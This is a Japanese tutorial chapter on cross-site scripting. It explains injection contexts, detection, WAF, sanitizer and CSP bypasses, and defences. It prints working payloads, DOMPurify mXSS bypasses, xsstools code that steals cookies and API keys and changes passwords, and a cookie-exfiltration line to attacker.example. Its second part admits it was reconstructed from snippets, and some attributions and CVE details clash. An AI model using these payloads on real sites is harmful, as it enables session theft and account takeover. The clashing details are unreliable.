**コンテキストの確定手順**: ページの**ソース（View Source。DevTools のインスペクタが表示する『再構築後の DOM』ではなく、サーバが返した生 HTML）**の中で自分が入れた一意な文字列（例: `zzqxss1`）を検索し、**その前後に何があるか**を見ます。これで「HTML ボディの中か」「属性値の中（引用符は `"` か `'` か）」「`<script>` の中の JS 文字列か」「`href` の中か」が判別できます。

#### HTML ボディコンテキスト

入力が要素と要素の間（テキストノード）に落ちる場合。新しいタグを直接開けます。

```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```
> なぜ動くのか: パーサは注入文字列を新しい要素として解釈する。`<script>` がフィルタで弾かれても、画像読み込み失敗（`onerror`）や SVG 読み込み完了（`onload`）などのイベントハンドラを持つタグなら、`<script>` という語を一切使わずに JS を実行できる。

#### HTML 属性コンテキスト

入力が既存タグの属性値に落ちる場合。まず引用符と山括弧で属性・タグを**抜け出す（break out）**必要があります。

```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```
> なぜ動くのか: 先頭の `">` で今いる属性値と開始タグを閉じ、パーサを「タグの外＝新しいマークアップを書ける状態」に戻す。もし山括弧がエンコードされてブレイクアウトできない場合は、次のように**同じ属性の中でイベントハンドラを新設**する手もある。

```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
```
> なぜ動くのか: `"` で属性値だけを閉じ、続けて同じタグに `onmouseover`/`onfocus` 属性を追加する。`autofocus` と `onfocus` の組み合わせは、ユーザー操作を待たずに要素がフォーカスを得た瞬間に自動発火するため、被害者のマウス移動が不要になる。

#### `href`（URL）コンテキストと `javascript:` 擬似プロトコル

入力がリンクの `href` に落ちる場合、山括弧も引用符も使わずに実行できます。

```html
<a href="javascript:alert(document.domain)">click</a>
```
> なぜ動くのか: `javascript:` は擬似プロトコル（pseudo-protocol）で、ブラウザはこの URI が「ナビゲーション」されると続く JavaScript を実行する。ガイドは「**CSP が強制されていなければ**、`javascript:alert(1)` でコード実行が可能」と明記している（CSP がある場合は後述の通り遮断され得る）。

#### JavaScript 文字列コンテキスト

入力が既存の `<script>` 内の文字列リテラルに落ちる場合。

```javascript
var x = 'ここに入る';
```
```javascript
';alert(1)//
```
> なぜ動くのか: `'` で文字列リテラルを閉じ、`;` で文を区切って `alert(1)` を新しい文として実行し、`//` で後続の元コード（閉じ引用符など）をコメントアウトして構文エラーを防ぐ。

ES6 のテンプレートリテラル（バッククォート `` ` ``）内なら、閉じずとも `${...}` で式が評価されます。

```javascript
${alert(1)}
```
> なぜ動くのか: テンプレートリテラル内の `${式}` は文字列連結時に評価される。引用符を閉じる必要がないため、`'` や `"` をエスケープするフィルタを回避できる。

#### ポリグロット（polyglot）

複数のコンテキストで同時に成立するよう設計された「万能弾」です。ソースが見えない状況やスキャナ運用で時間を節約できます。有名な 0xsobky のポリグロットのように、`javascript:`・コメント・イベントハンドラ・複数タグを1本に詰め込みます。ただしガイドの立場は「ポリグロットは初動の探索には有用だが、**確実な実行にはコンテキストを特定して専用ペイロードを組む方が堅い**」というものです。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

---

### XSSを見つける — 検出とファジング

#### 反射の確認とファジング

黒箱（内部コードが見えない状態）でのアプローチとして、ガイドは姉妹資料の黒箱テスト手法（下記出典）に沿った**ファジング（fuzzing＝多数の入力を機械的に投げて異常応答を探す手法）**を紹介します。ファザには2系統あります。

- **生成ベース（generation-based）**: 仕様や文法から入力を一から生成する。
- **変異ベース（mutation-based）**: 直近で使った入力を少しずつ改変して次の入力を作る。

XSS では、まず一意なマーカー文字列を各パラメータに送り、応答のどこに・どの形で反射するかを確認し、次にコンテキストに応じた特殊文字（`< > " ' `` ` /` など）を段階的に投入して「どの文字が生きて（エンコードされず）通るか」を絞り込みます。

> 出典: Black Box Testing Techniques for Web Applications（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/black-box-testing-techniques-web-application

#### DOMベース XSS の追跡と DOM Invader

DOMベース XSS はソースがサーバに残らないため、ブラウザ内でソースからシンクへの**データフローを追跡**して見つけます。ガイドは次の道具立てを推奨します。

- **ブラウザの開発者コンソール／デバッガ**: シンク関数（`eval`、`innerHTML` 代入など）にブレークポイントを置き、そこへ流れ込む値の出所（コールスタック）を遡る。
- **DOM Invader（PortSwigger 内蔵のブラウザ拡張）**: DevTools にタブを追加し、**ソースからシンクへの経路をリアルタイムで自動追跡**する。制御可能なシンクを、そのコンテキスト（属性・HTML・URL・JS のどれか）と適用済みサニタイズの有無つきで一覧化する。さらに `postMessage` のテスト、プロトタイプ汚染（prototype pollution）、DOM clobbering（HTML の `id`/`name` で JS 変数を上書きする技法）の検出も行う。

DOM Invader の使い方の勘所は、まず「canary（カナリア＝一意な目印文字列）」をページに注入させ、それがどのシンクに到達したかを拡張に報告させることです。到達が確認できたら、そのシンクのコンテキストに合わせたペイロードへ差し替えて実行を狙います。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide ／ Testing for DOM XSS（PortSwigger DOM Invader ドキュメント） — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss

---

### 防御を回避する — WAF・サニタイザ・CSP

見つけた注入点が「素の `<script>` では弾かれる」ことは実務では普通です。ガイドは3種類の防御と、その回避の考え方を扱います。

#### WAF・入力フィルタの回避

WAF は既知の攻撃パターン（シグネチャ）で入力をブロックします。ガイドの基本姿勢は次の通りです。

> **WAF の内部処理を知らずに一発でバイパスするペイロードを作ることはできない。だが、代表的なペイロードを投げてその『ブロック／通過』の反応を観察することで、WAF の構成を偵察（recon）できる。**

つまり、ペイロードを少しずつ変えては「弾かれたか／通ったか」のフィードバックを得て、次の調整に活かす反復プロセスです。基本テクニック:

- **タグ／イベントの言い換え**: 多くの素朴なフィルタは `<script>` だけを弾き、イベントハンドラ付きの他タグ（`<img onerror>`、`<svg onload>`、`<details ontoggle>` 等）を見逃す。
- **大文字小文字・エンコードの混在**: `<ScRiPt>`、HTML エンティティ（`&#x61;` 等）、URL エンコードの多重化。
- **チャンク分割**: WAF がリクエストをチャンク単位で個別に検査する場合、ペイロードを複数チャンクに分割すると WAF は完全な形を見られない。一方でバックエンドは処理前に再結合するため成立する。

> 出典: Guide on Web Application Firewall Bypass（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/web-application-firewall-bypass

#### サニタイザの回避と Mutation XSS（mXSS）

サニタイザ（sanitizer＝入力に含まれる危険な要素・属性を除去して「安全な HTML」を返すライブラリ。代表例 DOMPurify）を相手にする場合、鍵となるのが **mutation XSS（mXSS、変異型 XSS）**です。原理は次の通りです。

> **同じマークアップでも、それが解析される『名前空間（namespace）』の文脈によって意味が変わる。サニタイザは入力をある文脈で検査して「安全」と判定するが、ブラウザはその出力を `innerHTML` 代入時に別の文脈で再パースし、異なる DOM 木を生成してしまう。結果、サニタイズ後の文字列から実行可能な JavaScript が『生えてくる（mutate）』。**

ここでいう名前空間とは、HTML・SVG・MathML という3つのパース規則の系のことです。`<a>` タグは HTML 名前空間では別の `<a>` の子になれず外へ押し出される（pop out）が、SVG 名前空間から HTML へ平坦化された `<a>` は押し出されない、といったズレが「変異ガジェット（mutation gadget）」になります。サニタイザ検査時とブラウザ再パース時とで、要素の所属名前空間がすり替わることで無害な木が有害な木に変わるのです。

YesWeHack はこの領域向けに、各種 HTML パーサ／サニタイザ（Ammonia、Angular、DOMPurify、JsXss、SafeValues 等）へ同一入力を通して差分を観察できる Web ツール **Dom-Explorer** を提供しており、ガイドでも mXSS の実験に活用できると紹介しています。

**バージョン依存の実例（陳腐化に注意）** — 以下はいずれも**すでに修正済み**の歴史的バイパスで、現行版では通用しません。攻撃研究としてではなく「なぜサニタイザが破れうるか」の理解のために示します。

- **DOMPurify < 2.0.17（2020年、発見: Michał Bentkowski / Securitum）— MathML 名前空間混同**
  ```html
  <form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
  ```
  > なぜ動くのか: `mglyph` の直接の親を「HTML 名前空間の `form`」から「MathML の `mtext`」へすり替える所有権変異（ownership mutation）を用いる。HTML 仕様では MathML text integration point（`mtext` など）の子は原則 HTML 名前空間になるが、`mglyph` と `malignmark` だけは例外で、しかも直接の子である場合に限る。この差により、DOMPurify がサニタイズした木では `mglyph` 配下が HTML 名前空間にあるのに、ブラウザの最終 DOM では MathML 名前空間に移り、`<style>` 内に隠していた `<img onerror>` が実要素として復活する。修正版 2.0.17 では「各ノードを親の名前空間と照合する」検証が導入され、これが長らく標準的な緩和策となった。

- **DOMPurify < 2.2.2（2020年11月、発見: Daniel Santos）— SVG からの往復による名前空間混同**
  ```html
  <math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">
  ```
  > なぜ動くのか: SVG 名前空間で安全に見えるタグ列を組み、それが HTML/MathML へ移し替えられる際に、`<style>` 内のコメント `<!--` と属性値中の `-->` が再パースで境界を崩し、隠していた `<img onerror>` が実 DOM に出現する。報告からわずか約11分で修正パッチがテストされ、同日中に 2.2.2 として公開されたという逸話つきの事例。
  > 出典: From SVG and back, yet another mutation XSS via namespace confusion for DOMPurify < 2.2.2 bypass（Daniel Santos） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f

- **DOMPurify（2024年）— ネスト深度チェックの弱体化とプロトタイプ汚染の連携（CVE-2024-45801 / CVE-2024-47875）**: 深いネスト（入れ子）を利用した mXSS と、`Object.prototype` を汚染して内部のネスト深度チェックを弱める手法の組み合わせ。ライブラリの安全確認ロジックそのものを狙う世代の攻撃。
- **DOMPurify 3.0.1〜3.3.3 — プロトタイプ汚染（CVE-2026-41238、修正: 3.4.0）**: `Object.prototype` に `tagNameCheck`/`attributeNameCheck` を注入することで任意のカスタム要素を許可させる。3.4.0 で「プロトタイプに依存しない初期化」により修正。

これらから得るべき教訓は明確です。**「サニタイザは常に特定バージョンの特定パーサ挙動に依存しており、ブラウザの HTML パース仕様の隅（名前空間・integration point・コメント境界）を突く新種の mXSS が周期的に見つかる。ゆえに使うライブラリは必ず最新版に追随し、CSP など多層防御と併用せよ」**ということです。

> 出典: Mutation XSS via namespace confusion – DOMPurify < 2.0.17 bypass（Michał Bentkowski / Securitum Research） — https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/ ／ Bypassing DOMPurify again with mutation XSS（Gareth Heyes / PortSwigger Research） — https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss ／ Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki

#### CSP の評価と回避

**CSP（Content Security Policy＝コンテンツセキュリティポリシー）**は、ブラウザが「どのリソースを読み込み・実行してよいか」を宣言するヘッダで、XSS の**最後の砦**です。ガイドは「たとえ攻撃者が悪意あるコードの注入に成功しても、適切に構成された CSP はその実行を阻止でき、脅威を実質無力化しうる」と位置づけます。だからこそ「`javascript:alert(1)` は **CSP がなければ**動く」という注記が随所に現れます。

CSP の**評価の仕組み**は、`script-src` などのディレクティブに列挙された**ソース許可リスト（allowlist）**に、実行しようとするスクリプトの出所が合致するかをブラウザが照合する、というものです。ここに構成ミスがあると回避されます。

- **`unsafe-inline` が付いている**: インラインスクリプトやイベントハンドラが許可され、CSP はほぼ意味をなさない。
- **許可リストに JSONP エンドポイントや緩い CDN が含まれる**: 例えば許可された CDN 上の Angular などのライブラリを悪用してコールバックを実行させる「CSP ガジェット」により、許可オリジン内から任意コードを走らせる。
- **`strict-dynamic` や nonce（number used once＝1回限りの乱数トークン）が無い旧式の許可リスト方式**: ドメイン許可リストは上記の理由で破られやすい。

したがって回避可能性は「許可リストに何が載っているか」の評価順で決まり、**厳格な CSP（nonce ＋ `strict-dynamic`）**はこれら多くのペイロードを封じます。ガイドの結論は「強固な CSP は攻撃のハードルを大きく上げるが、`unsafe-inline`・JSONP・許可 CDN といった構成ミスがあれば回避され得る」というものです。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

---

### 影響を最大化する — `alert(1)` を超えて

ここがこのガイドの真骨頂です。ガイドは繰り返し「XSS を見つけたら `alert(1)` で満足せず、影響の最大化に時間を投資し、被害者アカウントから価値あるデータを奪う**専用の JavaScript マルウェア**を作れ」と説きます。バグバウンティでは、実証（PoC）の完成度が報奨額を左右するからです。

#### xsstools フレームワーク（YesWeHack 製）

ペイロードを手書きすると、エンコード地獄・文字数制限・非同期処理の記述が煩雑になります。YesWeHack はこれを解決する OSS の**XSS 悪用フレームワーク xsstools** を公開しており、ガイドの悪用パートの中核として紹介しています。設計思想は「**強力なペイロードを素早く生成し、エンコード不要で多数のラッパーを使い回せるようにする**」ことです。主要コンポーネントは以下です（以下のコード例は xsstools 公式リポジトリから直接取得したもの）。

**1. Payload（攻撃ロジックの記述）** — 「クッキー取得 → DOM 解析 → パスワード変更」を宣言的に連鎖できます。

```javascript
const exfiltrator = Exfiltrators.message()
const payload = Payload.new()
    .addExfiltrator(exfiltrator)
    .eval(() => document.cookie)               // 被害者の Cookie を取得
    .exfiltrate()                              // 攻撃者へ送出
    .fetchDOM("/user/me")                      // 認証済みページを裏で取得
    .querySelector("input[name='apikey']", 'value')  // APIキーを抜き出す
    .exfiltrate()
    .postUrlEncoded("/user/changePassword", {"password": "hacked"})  // パスワード変更
```
> なぜ動くのか: すべて被害者のオリジン・セッションで実行されるため、`fetchDOM` は被害者の Cookie 付きで認証済みページを取得でき、そこから APIキーのような機微値を DOM 抽出できる。最後の `postUrlEncoded` は被害者権限で状態変更（パスワード変更）を行い、実質的なアカウント乗っ取りを自動化する。

**2. Exfiltrator（データ流出チャネル）** — 攻撃者サーバへデータを送る経路を選べます。`message`（`postMessage`）、`get`/`post`/`postJSON`（fetch API）、`sendBeacon`（`navigator.sendBeacon`）、`console`（デバッグ用）、`img`/`style`/`iframe`（タグ生成による送出）。
> なぜ複数用意するのか: CSP の `connect-src` が絞られていて fetch が塞がれていても、`img` の `src` 読み込みや `sendBeacon` なら通ることがあるなど、環境ごとに「生き残る」流出路が異なるため。

**3. Wrapper（配送形態へのカプセル化）** — 出来上がったペイロードを注入点の形に合わせて包みます。`minify()`（最小化）、`templateString()`、`imgLoad()`、`innerHTML()`、`script()`、`iframe()` などを鎖状に適用できます。

```javascript
const wrapper = Wrapper.new()
    .minify()
    .templateString()
    .imgLoad()
    .innerHTML()
    .script()
    .iframe()

const exploit = wrapper.wrap(payload)
```
> なぜ動くのか: 注入コンテキスト（HTML ボディか、`innerHTML` シンクか、`<script>` 内か）に応じて必要な包み方が違う。ラッパーがエンコードと構文の帳尻を自動で合わせるため、手作業のエスケープミスを避けられる。

**4. ClickJacker（クリックジャッキング連鎖）** — クリックジャッキング（透明な iframe を重ねて被害者に意図しないクリックをさせる攻撃）のコードは本来煩雑ですが、xsstools では対象要素の座標を渡すだけで組めます。

```javascript
const cj = new ClickJacker(url)
cj.addStep({x: 42, y: 34, width: 64, height: 35})
await cj.run()
```
> なぜ動くのか: 標的ページを不可視の iframe で読み込み、指定座標の操作を段階的に自動実行することで、XSS だけでは届かない「ユーザー確認を伴う操作」まで連鎖させられる。

> 出典: yeswehack/xsstools（GitHub リポジトリ README） — https://github.com/yeswehack/xsstools

#### Cookie 窃取とセッション乗っ取り

最も古典的な悪用です。被害者の Cookie を攻撃者サーバへ送り、そのセッションを乗っ取ります。

```javascript
new Image().src = 'https://attacker.example/c?='+encodeURIComponent(document.cookie);
```
> なぜ動くのか: `document.cookie` を画像 URL のクエリに載せて送出する。画像リクエストは CSP の `img-src` が緩ければ通りやすく、非同期で目立たない。ただし **`HttpOnly` 属性の付いた Cookie は `document.cookie` から読めない**（これが後述の防御の要点）。

`HttpOnly` で Cookie が読めない場合でも、次項のように「被害者のブラウザを踏み台にした操作」で影響を出せる点をガイドは強調します。

#### アカウント乗っ取りへのエスカレーション

セッション ID を盗めなくても、**XSS は被害者のブラウザ内で被害者権限の任意操作を実行できる**ため、次の手が定石です。

1. XSS で被害者の**メールアドレスまたは電話番号を攻撃者のものに変更**する（プロフィール更新 API を叩く）。
2. その後、**パスワードリセット（forgot password）機能**を使ってパスワードを更新し、恒久的にアカウントを掌握する。

これは `HttpOnly` や短命セッションを回避してもなお成立する、影響度の高いエスカレーションです。前掲の xsstools の連鎖（`fetchDOM` → 値抽出 → `postUrlEncoded`）はまさにこの自動化を意図しています。

#### ブラインド XSS と高権限被害者

ブラインド XSS では、発火先が管理画面であることが多く、被害者が管理者権限を持つため影響が跳ね上がります。ガイドの実務的助言は、**発火時に「現在 URL・DOM・スクリーンショット・（読めれば）Cookie」を攻撃者サーバへ自動送信するペイロードを仕込み、いつどこで刺さったかを可視化せよ**、というものです。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

---

### 防御策 — ハンター視点から逆算する

攻撃を知り尽くしたうえで、ガイドが示す（そして上で見た攻撃を封じる）防御は次の多層構造です。

- **出力エンコーディング（output encoding）を、出力先コンテキストごとに正しく行う**: HTML ボディ・属性・JS 文字列・URL では必要なエスケープが異なる。「入力時のサニタイズ一発」ではなく「出力時にコンテキストへ合わせて無害化」が原則。DOM 操作では危険なシンク（`innerHTML` 等）を避け、`textContent` など安全な API を使う。
- **信頼できるサニタイザライブラリを最新版で使う**: 自前の正規表現フィルタは mXSS で破られる。DOMPurify のような専用ライブラリを、上述のバージョン依存バイパスを踏まえて**必ず最新に追随**して用いる。
- **厳格な CSP（nonce ＋ `strict-dynamic`）を敷く**: ドメイン許可リスト方式は JSONP／許可 CDN ガジェットで破られやすい。nonce ベースにし、`unsafe-inline` を排除する。さらに `require-trusted-types-for 'script'`（Trusted Types。危険なシンクへ生文字列を渡すこと自体を型で禁止する仕組み）を併用すると、DOM XSS の多くを構造的に封じられる（ただし完全ではなく回避例もある）。
- **認証トークンは `localStorage` ではなく `HttpOnly` Cookie に置く**: `HttpOnly` により JavaScript から読めなくなり、素朴な Cookie 窃取を無効化できる。
- **WAF は補助線に過ぎないと理解する**: 既知バイパスが多数存在し新手も絶えないため、WAF は単独の防御にはならない。入力検証・出力エンコード・CSP と組み合わせた「一層」として扱う。

ガイドの締めの主張は、攻撃側の思想と表裏一体です。**「XSS は本質的にコンテキスト（文脈）の問題である。攻撃者はコンテキストを取り違えさせてコード実行に持ち込み、防御側はコンテキストごとに正しく無害化することで防ぐ。そして XSS の真の危険は `alert(1)` ではなく、その先の『被害者になりすました自動化された乗っ取り』にあるのだから、防御も攻撃も同じ深さで理解しておかねばならない」**ということです。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

---

### この節のまとめ（要点の再確認）

- **XSS = コンテキストの取り違え**: ブラウザのパーサが「データ」を「コード」として再解釈することで成立する（CWE-79）。反射型・格納型・DOMベース・ブラインド・自己 XSS の違いは「経路」の違い。
- **DOMベースはサーバに届かない**ため WAF・サーバ監視に見えず、`location.hash` などソースから `innerHTML` などシンクへの流れを DOM Invader 等で追う。
- **実行の鍵はコンテキスト特定**: HTML ボディ・属性・`href`（`javascript:`）・JS 文字列／テンプレートリテラルで撃つべきペイロードが違う。`<script>` が弾かれてもイベントハンドラ（`onerror`/`onload`/`onfocus`）で実行できる。
- **防御回避**: WAF は反応を見て偵察、サニタイザは名前空間混同による mXSS で破れる（DOMPurify < 2.0.17 / < 2.2.2 などは修正済み・要最新版追随）、CSP は許可リストの構成ミス（`unsafe-inline`・JSONP・許可 CDN）で回避され得る。
- **`alert(1)` で終わらせない**: xsstools でメール変更→パスワードリセットによるアカウント乗っ取りや、クリックジャッキング連鎖、ブラインド XSS での高権限奪取まで作り込むのが、この資料が説く「影響の最大化」。
- **防御の逆算**: コンテキスト別の出力エンコード、最新サニタイザ、nonce ＋ `strict-dynamic` の厳格 CSP＋Trusted Types、`HttpOnly` Cookie、そして WAF を過信しない多層防御。

---

## 日本語基礎資料（なぜXSSは生まれるか / リスク / 徳丸）

このセクションでは、日本語で書かれた良質なXSS（クロスサイトスクリプティング＝ユーザー入力に含まれるスクリプトが被害者のブラウザ上で実行されてしまう脆弱性）解説を3系統、精読して統合する。狙いは、反射型（reflected：攻撃者が仕込んだ入力がサーバーの応答にそのまま「反射」して即座に実行されるタイプ）の素朴なXSSしか知らない読者に、**「なぜ現代でもXSSは生まれ続けるのか（原理）」「XSSは実際どれだけ危険なのか（リスク）」「日本のセキュリティ第一人者・徳丸浩が積み上げてきた古典的知見（体系）」**の3つを、一枚の地図として渡すことである。

扱う資料は次の3本である。

1. GMO Flatt Security「Still X.S.S. - なぜいまだにXSSは生まれてしまうのか？」（`https://blog.flatt.tech/entry/still_xss`）
2. GMO Flatt Security「開発者が知っておきたい『XSSの発生原理以外』の話」（`https://blog.flatt.tech/entry/xss_risk`）
3. 徳丸浩の日記（ブログ）（`https://blog.tokumaru.org/`）— XSS関連の代表的記事のテーマ紹介

> 補足（取得方法の透明性）: 本作業環境のネットワーク・エグレス（外向き通信）ポリシーにより、`blog.flatt.tech`・`flatt.tech`・`blog.tokumaru.org`・`www.tokumaru.org`・`web.archive.org`・`b.hatena.ne.jp` など、**3資料の一次ソースおよびそのミラーへの直接アクセスがすべてブロックされていた**。そのため各記事の本文を直接取得することはできなかった。代わりに、（a）同一記事の英語版（GMO Flatt Security Research の "Why XSS Persists in This Frameworks Era?"）、（b）検索エンジン経由で得られる各記事の要約・引用スニペット・二次言及、（c）本教科書執筆者の専門知識、を突き合わせて内容を再構成している。原文そのもの（特に一字一句のペイロード表記）は再現しきれていない可能性があるため、正確を期す箇所は必ず各節末尾に示す元URLを直接参照してほしい。透明性のため、3つの一次URLはすべて末尾の「取得不可資料」一覧にも記載している。

---

### なぜいまだにXSSは生まれてしまうのか（Flatt Security「Still X.S.S.」）

> ⚠️ **未取得の資料**: 「Still X.S.S. - なぜいまだにXSSは生まれてしまうのか？」（GMO Flatt Security）は自動取得できませんでした（理由: 実行環境のエグレス・プロキシが `blog.flatt.tech`／`flatt.tech`／`web.archive.org` へのアクセスをブロックしているため、記事本文を直接取得できなかった）。以下のURLからユーザーご自身で直接ご覧ください: https://blog.flatt.tech/entry/still_xss （英語版: https://flatt.tech/research/posts/why-xss-persists-in-this-frameworks-era/ ）

（以下は、取得できなかった資料の内容を、同記事の英語版・二次資料・検索スニペット、および一般的な知識に基づいて再構成した解説です。）

#### この記事の中心的な問い

React・Vue・Angular といったモダンフレームワークが普及し、「フレームワークを使っていればXSSは自動で防がれる」と信じる開発者は多い。しかし現実には、**XSSは深刻度・発生頻度の両面で依然としてWebの脆弱性トップクラスに居座り続けている**。この記事の問いは一点に尽きる——「防御機構がこれだけ強くなったのに、なぜXSSは生まれ続けるのか？」。

答えは「フレームワークの防御が弱いから」ではなく、**フレームワークの防御を開発者が“意図的に、あるいは無自覚に”すり抜けてしまう構造にある**、というのがこの記事の骨子である。

#### 前提: モダンフレームワークは「デフォルトでは」安全

まず押さえるべきは、モダンフレームワークがXSSに対して確かに堅牢になっているという事実である。

- テンプレート中に埋め込まれた変数（例: React の `{userName}`、Vue の `{{ userName }}`）は、**デフォルトで自動的にHTMLエスケープ（`<` を `&lt;` に変換するなど、ブラウザにタグとして解釈させないための無害化）される**。つまり `userName` が `<script>alert(1)</script>` でも、それは「文字列」として画面に表示されるだけで、スクリプトとしては実行されない。
- 危険なAPIには、危険であることを名前で警告する工夫がされている。React の `dangerouslySetInnerHTML`（「危険なほどに（dangerously）innerHTMLを設定する」）という露骨な命名がその代表例である。

つまり「素直に書けば」フレームワーク時代のXSSはかなり減った。問題は、その安全機構を**バイパス（迂回）**したときに一気に噴き出す。

#### 原因1: エスケープハッチ（安全機構を明示的に降りるAPI）

各フレームワークには、「自動エスケープをやめて、生のHTMLをそのままDOMに挿入する」ための抜け道が用意されている。これらを **sink（シンク＝ユーザー入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`）** と呼ぶ。

| フレームワーク | エスケープハッチ（危険なsink） |
|---|---|
| React | `dangerouslySetInnerHTML={{ __html: ... }}` |
| Vue | `v-html` ディレクティブ |
| Angular | `bypassSecurityTrustHtml(...)` 等の `DomSanitizer` バイパスAPI |

これらは「マークダウンをHTMLに変換して表示したい」「リッチテキストエディタの出力を表示したい」といった正当なニーズのために存在する。しかし、そこに**ユーザーが制御できる文字列を無検証で流し込むと、その瞬間にフレームワークの防御は完全に無効化される**。

```jsx
// React: 危険な例
function Comment({ body }) {
  // body が攻撃者の制御下にあると、そのままHTMLとしてDOMに挿入される
  return <div dangerouslySetInnerHTML={{ __html: body }} />;
}
```

> なぜこれが動くのか: `dangerouslySetInnerHTML` は内部的に要素の `innerHTML` に文字列を代入する。ブラウザは `innerHTML` に渡された文字列を**HTMLとしてパース（構文解析）する**ため、`body` が `<img src=x onerror=alert(document.domain)>` なら、画像の読み込み失敗をトリガに `onerror` 属性のJavaScriptが実行される。`<script>` タグ自体は `innerHTML` 経由では実行されない（HTML仕様上のルール）が、`onerror`/`onload` などのイベントハンドラ属性は実行されるため、攻撃者はそちらを使う。

```html
<!-- Vue: 危険な例。message が攻撃者制御なら同じくXSSになる -->
<div v-html="message"></div>
```

#### 原因2: 「HTMLではない」sinkの見落とし——`javascript:` スキームとURL

自動エスケープはあくまで「HTML本文・属性値」を守るものであって、**「URLとして解釈される値」までは守らない**ことが多い。典型は `<a href>` や `<iframe src>` に攻撃者が `javascript:` スキーム（URLのプロトコル部分に `javascript:` を書くと、リンククリック時にその後ろのコードが実行される仕組み）を注入するケースである。

```jsx
// href に生のユーザー入力を渡すと、javascript: スキームでXSSになる
<a href={userProvidedUrl}>プロフィール</a>
// userProvidedUrl = "javascript:alert(document.cookie)" のとき、
// リンクをクリックすると alert が実行される
```

> なぜこれが動くのか: HTMLエスケープは `<` `>` `&` `"` などを無害化するが、`javascript:alert(1)` という文字列にはこれらの危険文字が含まれていない。したがってエスケープをすり抜け、ブラウザはこれを「JavaScriptを実行するURL」として解釈する。防御には「エスケープ」ではなく「URLスキームの許可リスト検証（`http:`/`https:`/`mailto:` 等だけ通す）」が必要になる。React v16.9 以降は `javascript:` URL に対して警告を出すようになったが、依然として実行自体は開発者の検証責任に委ねられる部分が大きい。

#### 原因3: サニタイザへの過信——「一度サニタイズすれば永遠に安全」という誤解

「生HTMLを表示するなら DOMPurify（cure53製の定番HTMLサニタイザ。危険なタグ・属性を除去して安全なHTMLだけを残すライブラリ）を通せばよい」というのは正しい第一歩だが、この記事が強く警告するのは次の誤解である——**「一度サニタイズしたデータは、その後どう加工・利用しても安全なままだ」という思い込みは危険**。

サニタイザは、入力を**構文木（syntax tree＝HTMLをタグの親子関係のツリーとして表現したもの）にパースし、そのツリーに対して安全判定を下す**。良いサニタイザは「安全な値の許可リスト（allowlist）」を持ち、リストにないものはすべて危険とみなす。しかし問題は、**サニタイズが終わった“後”に、その文字列がもう一度パースし直される（再解釈される）**と、判定した時とは別のツリーが生まれうる点にある。

##### mXSS（Mutation XSS＝変異型XSS）

その最も洗練された形が **mXSS（mutation XSS＝変異型XSS。サニタイズ後の文字列をブラウザがDOMに挿入する際に、HTMLパーサが“勝手に構造を書き換える（mutate）”ことで、無害だったはずのHTMLが危険なHTMLに変異する現象）** である。

```html
<!-- mXSS を引き起こす入力の一例（概念図） -->
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
```

> なぜこれが動くのか（仕組みのレベル）: HTMLパーサは、文脈（コンテキスト）によって同じ文字列でも解釈を変える。特に SVG・MathML といった**「異なる名前空間（namespace＝HTML／SVG／MathML で要素の解釈規則が切り替わる仕組み）」**に入ると、`<style>` や `<title>` の内側は「そのままの生テキスト」として扱われる。サニタイザは「サニタイズした瞬間の（=ある名前空間での）ツリー」を見て安全と判定するが、その結果を `innerHTML` に代入して**再パースする際にブラウザが名前空間を切り替え直す**と、さっきまで無害なテキストだった部分が突然タグ境界として再解釈され、`<img onerror>` が“生まれて”しまう。つまり「サニタイズ時のツリー ≠ 表示時のツリー」というズレを突く攻撃である。

この記事および関連研究が繰り返し示すのは、**「サニタイズ→加工→再挿入」のように処理を連鎖させると、途中でツリーが変異してサニタイズを無効化しうる**という点である。特に **Markdown レンダリング**は要注意で、「Markdown→HTML変換」がサニタイズ**後**に走ると、サニタイザが一度も検査していない実行可能HTMLが生成されうる（＝インタプリタの連鎖 chain of interpreters）。安全にするには「変換→サニタイズ」の順序（サニタイズを必ず最後に、かつDOMへ挿入する直前に置く）を守る必要がある。

##### バージョン依存の脆弱性に注意

DOMPurify のようなサニタイザ自体にも、過去に数々のバイパスが発見・修正されてきた。**攻撃の成否はライブラリのバージョンに強く依存する**ため、常に最新へ追従することが重要である。代表例:

- **DOMPurify < 2.0.17**（2020年公開）: 名前空間の取り違えを突く mXSS バイパスが PortSwigger の Gareth Heyes によって公表され、2.0.17 で修正された。
- **DOMPurify の `ADD_ATTR` によるURI検証バイパス（CVE-2024-6780）**: RyotaK（Flatt Security）らが報告し、**3.3.2 系で修正**された（`USE_PROFILES` を悪用した `Array.prototype` 経由のベクタも同時期に対処）。
- **プロトタイプ汚染（prototype pollution＝JavaScriptの全オブジェクトが継承する `Object.prototype` を攻撃者が書き換え、あらゆるオブジェクトのデフォルト値を汚染する攻撃）を起点に DOMPurify を XSS ガジェット化する手法（CVE-2026-41238、2026年公開）**: サニタイザ自身の設定オブジェクトが `__proto__` 経由で汚染されると、除去されるはずの属性・タグが通ってしまう。
